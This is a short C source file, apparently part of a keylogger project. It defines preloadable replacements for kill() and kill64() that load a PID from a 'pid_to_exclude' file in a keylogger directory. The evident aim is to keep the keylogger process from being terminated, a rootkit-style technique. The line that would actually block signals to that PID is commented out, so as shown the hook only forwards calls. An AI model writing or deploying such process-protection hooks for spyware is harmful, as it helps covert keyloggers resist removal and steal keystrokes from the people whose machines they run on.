# define _GNU_SOURCE

#include <dirent.h>
#include <stdio.h>
#include <dlfcn.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <fcntl.h>
#include <signal.h>

static	pid_t	to_exclude = 0;

#define DECLARE_KILL(kill)												\
static	int (*original_##kill)(pid_t, int) = NULL;						\
																		\
int	kill(pid_t pid, int sig)											\
{																		\
	int		ret;														\
	int		fd;															\
	if (original_##kill == NULL)										\
	{																	\
		original_##kill = dlsym(RTLD_NEXT, #kill);						\
		if (original_##kill == NULL)									\
		{																\
			fprintf(stderr, "Error in dlsym: %s\n", dlerror());         \
			return 0;													\
		}																\
	}																	\
	if (to_exclude == 0)												\
	{																	\
		if ((fd = open("/home/user42/Bureau/keylogger/pid_to_exclude", O_RDONLY)) != -1)\
		{																\
			if (read(fd, &to_exclude, sizeof(pid_t)) == -1)				\
				to_exclude = -1;										\
		}																\
	}																	\
	/* if (pid == to_exclude)												\
		return -1;	*/													\
	ret = original_##kill(pid, sig);									\
	return ret;															\
}

DECLARE_KILL(kill64);
DECLARE_KILL(kill);


